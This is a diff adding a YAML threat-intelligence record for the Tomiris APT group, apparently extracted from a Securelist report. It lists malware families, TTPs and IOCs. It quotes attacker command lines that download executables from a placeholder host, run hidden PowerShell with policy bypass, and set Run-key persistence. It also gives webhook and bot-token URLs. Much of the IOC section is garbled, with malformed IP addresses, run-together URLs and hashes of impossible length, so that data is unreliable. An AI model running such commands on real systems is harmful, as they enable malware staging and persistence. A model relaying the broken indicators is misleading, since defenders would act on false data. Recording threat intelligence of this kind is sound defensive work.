@@ -1,0 +1,159 @@
+description: "The report details the Tomiris threat actor\u2019s 2025 campaign involving\
+  \ multi\u2011language implants, phishing delivery, and use of public services (Telegram/Discord)\
+  \ for C2."
+attribution: Tomiris APT group, Russia
+malware_families:
+- AdaptixC2
+- Havoc
+- Tomiris C/C++ ReverseShell
+- Tomiris Rust Downloader
+- Tomiris Python Discord ReverseShell
+- Tomiris Python FileGrabber
+- Tomiris Python Telegram ReverseShell
+- Tomiris C# Telegram ReverseShell
+- Tomiris Rust ReverseShell
+- Tomiris C++ ReverseSocks (based on GitHub Neosama/Reverse-SOCKS5)
+- Tomiris Go ReverseSocks (based on GitHub Acebond/ReverseSocks5)
+- Tomiris PowerShell Telegram Backdoor
+- Tomiris C# ReverseShell
+- Tomiris Go ReverseShell
+- JLORAT
+- Backdoor.Win64.RShell.gen
+- Backdoor.MSIL.RShell.gen
+- Backdoor.Win64.Telebot.gen
+- Backdoor.Python.Telebot.gen
+- Trojan.Win32.RProxy.gen
+- Trojan.Win32.TJLORT.a
+- Backdoor.Win64.AdaptixC2.a
+TTPs:
+  processes:
+  - winupdate.exe
+  - offel.exe
+  - sysmgmt.exe
+  - dwm.exe
+  - msview.exe
+  - spoolsvc.exe
+  - svchost.exe
+  - service.exe
+  - firefox.exe
+  - rever.exe
+  - winsrv.exe
+  commandline:
+  - cmd /c "curl -o $public\\videos\\offel.exe http://<HOST>/offel.exe"
+  - cmd /c "dir"
+  - cmd /c "dir C:\\user\\[username]\\pictures"
+  - cmd /c "pwd"
+  - cmd /c "curl -O $public\\sysmgmt.exe http://<HOST>/private/svchost.exe"
+  - cmd /c "$public\\sysmgmt.exe"
+  - powershell -ep Bypass -w hidden -File %temp%\\script.ps1
+  - powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABjAGgAYQB0AF8AaQBkACAAPQAgACIANwA3ADAAOQAyADIAOAAyADgANQ...
+  powershell:
+  - Invoke-WebRequest -Uri https://<HOST>/winupdate.exe -OutFile $public\\pictures\\sbschost.exe
+  - Invoke-Command -ScriptBlock {Start-Process $env:Temp\\1.zip}
+  - Invoke-Expression "powershell -ep Bypass -w hidden -File %temp%\\script.ps1"
+  scripting_engine:
+  - script.vb
+  - script.ps1
+  - script.vbs
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdate /t REG_SZ
+    /d $public\\pictures\\winupdate.exe /f
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Win-NetAlone" /t REG_SZ
+    /d "$public\\videos\\alone.exe"
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Winservice" /t REG_SZ
+    /d "$public\\Pictures\\dwm.exe"
+  image_load: []
+  network_connections:
+  - process: winupdate.exe
+    destination: 193.149.129[.]113
+    port: ''
+  - process: offel.exe
+    destination: <HOST>
+    port: ''
+  - process: sysmgmt.exe
+    destination: <HOST>/private/svchost.exe
+    port: ''
+  - executable: ''
+    destination_address: 185.231.154.84
+    port: ''
+  - executable: ''
+    destination_address: 192.165.32.78
+    port: ''
+  file_activity:
+  - '%public\\libraries\\winvt.exe'
+  - '%public\\libraries\\service.exe'
+  - '%public\\libraries\\AkelPad.rar'
+  - $public\\pictures\\sbschost.exe
+  - $public\\videos\\offel.exe
+  - $public\\Videos\\sysmgmt.exe
+  persistence:
+  - Run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run entries for WinUpdate,
+    Win-NetAlone, Winservice
+  process_relations: []
+IOCs:
+  hashes:
+  - B8FE3A0AD6B64F370DB2EA1E743C84BB
+  - 091FBACD889FA390DC76BB24C2013B59
+  - C0F81B33A80E5E4E96E503DBC401CBE
+  - 42E165AB4C3495FADE8220F4E6F5F696
+  - 2FBA6F91ADA8D05199AD94AFFD5E5A18
+  - 0F955D7844E146F2BD756C9CA8711263
+  - 78BE0065D0277935CDCF7E3E9DB467933ED1534BBC8BD51E7E2CF01CADC9646
+  - 1083B668459BEACBC097B3D4A103623F
+  - C73C545C32E5D1F72B74AB0087AE1720
+  - 9A9B1BA210AC2EBFE190D1C63EC707FA
+  - 2ED5EBC15B377C5A03F75E07DC5F1E08
+  - C75665E77FFB3692C2400C3C8DD8276B
+  - DF95695A3A93895C1E87A76B4A8A9812
+  - 087743415E1F6CC961E9D2BB6DFD6D51
+  - 83267C4E942C7B86154ACD3C58EAF26C
+  - CD46316AEBC41E36790686F1EC1C39F01241455DA8AADC1D828F89476F7183B7F1DCA0C280E86C39873D8B6AF40F7588
+  - 4EDC02724A72AFC3CF78710542DB1E6ED
+  ips:
+  - 77.232.39.47109
+  - 172.85.63109
+  - 172.85.95185
+  - 173.37.67185
+  - 231.155.111195
+  - 2.81.99
+  - 185.209.30.41
+  - 185.231.154.84
+  - 185.244.180.16991
+  - 191.2.78.133
+  - 192.165.32.78188
+  - 192.153.57.9
+  - 193.149.129.113
+  - 62.113.114.209
+  - 62.113.115.89
+  - 82.115.223.218
+  - 82.115.223.210
+  - 88.214.26.37
+  - 141.98.82.198
+  - 85.209.128.171
+  domains:
+  - discord.com
+  - api.telegram.org
+  urls:
+  - hxxps://discord[.]com/api/webhooks/1357597727164338349/ikaFqukFoCcbdfQIYXE91j-dGB-8YsTNeSrXnAclYx39Hjf2cIPQalTlAxP9-2791UCZ
+  - hxxps://discord[.]com/api/webhooks/1370623818858762291/p1DC3l8XyGviRFAR50de6tKYP0CCr1hTAes9B9ljbd-J-dY7bddi31BCV90niZ3bxIMuh
+  - hxxps://discord[.]com/api/webhooks/1388018607283376231/YYJe-lnt4HyvasKlhoOJECh9yjOtbllL_nalKBMUKUB3xsk7Mj74cU5IfBDYBYX-E78Gh
+  - hxxps://discord[.]com/api/webhooks/1386588127791157298/FSOtFTIJaNRT01RVXk5fFsU_sjp_8E0k2QK3t5BUcAcMFR_SHMOEYyLhFUvkY3ndk8-wh
+  - hxxps://discord[.]com/api/webhooks/1369277038321467503/KqfsoVzebWNNGqFXePMxqi0pta2445WzYNsY9EsYv1u_iyXAfYL3GGG76bCKy3-a75h
+  - hxxps://discord[.]com/api/webhooks/1396726652565848135/OFds8Do2qH-C_V0ckaF1AJJAqQJuKq-YZVrO1t7cWuvAp7LNfqI7piZlyCcS1qvwpXTZ
+  - hxxp://62.113.115[.]89/homepage/infile.php
+  - hxxps://api.telegram[.]org/bot7562800307:AAHVB7Ctr-K52J-egBlEdVoRHvJcYr-0nLQ/Tomiris
+    Python Telegram ReverseShell
+  - hxxps://api.telegram[.]org/bot7804558453:AAFR2OjF7ktvyfygleIneu_8WDaaSkduV7k/Tomiris
+    C# Telegram ReverseShell
+  - hxxp://82.115.223[.]218/hxxp://172.86.75[.]102/hxxp://193.149.129[.]113/JLORAThxxp://82.115.223[.]210:9942/bot_authhxxp://88.214.26[.]37:9942/bot_authhxxp://141.98.82[.]198:9942/bot_auth
+  - hxxps://api.telegram[.]org/bot8044543455:AAG3Pt4fvf6tJj4Umz2TzJTtTZD7ZUArT8E/hxxps://api.telegram[.]org/bot7864956192:AAEjExTWgNAMEmGBI2EsSs46AhO7Bw8STcY/hxxps://api.telegram[.]org/bot8039791391:AAHcE2qYmeRZ5P29G6mFAylVJl8qH_ZVBh8/hxxps://api.telegram[.]org/bot7157076145:AAG79qKudRCPu28blyitJZptX_4z_LlxOS0/hxxps://api.telegram[.]org/bot7649829843:AAH_ogPjAfuv-oQ5_Y-s8YmlWR73Gbid5h0/Tomiris
+    PowerShell Telegram Backdoor
+  ip_addresses:
+  - 185.231.154.84
+  - 192.165.32.78
+authors:
+- Oleg Kupreev
+- Artem Ushkov
+reference: https://securelist.com/tomiris-new-tools/118143
+date_of_publication: November 28, 2025
+file_creation_date: November 29, 2025
